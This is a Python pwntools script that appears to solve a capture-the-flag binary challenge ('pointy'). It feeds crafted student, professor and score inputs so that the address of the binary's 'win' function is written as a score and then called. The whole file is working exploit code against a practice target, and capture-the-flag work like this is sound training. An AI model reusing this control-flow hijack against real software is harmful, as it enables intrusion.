import os;os.environ['TMPDIR'] = os.path.join(os.environ['HOME'], 'tmp')
import pwn

remote_binary = "/problems/pointy_4_3b3533bd4e08119669feda53e8cb0502/vuln"

def attack():
    try:
        pr = pwn.process(remote_binary)
        elf = pwn.ELF(remote_binary, False)
        pr.sendlineafter("Input the name of a student\n", "A")
        pr.sendlineafter("Input the name of the favorite professor of a student \n", "B");
        pr.sendlineafter("Input the name of the student that will give the score \n", "A");
        pr.sendlineafter("Input the name of the professor that will be scored \n", "B");
        pr.sendlineafter("Input the score: \n", str(elf.sym["win"]));

        pr.sendlineafter("Input the name of a student\n", "B")
        pr.sendlineafter("Input the name of the favorite professor of a student \n", "C");
        pr.sendlineafter("Input the name of the student that will give the score \n", "B");
        pr.sendlineafter("Input the name of the professor that will be scored \n", "C");
        pr.sendlineafter("Input the score: \n", str(1));

        rsp = pr.readall(timeout=0.5)
        print(rsp)
    finally:
        pr.close()

attack()
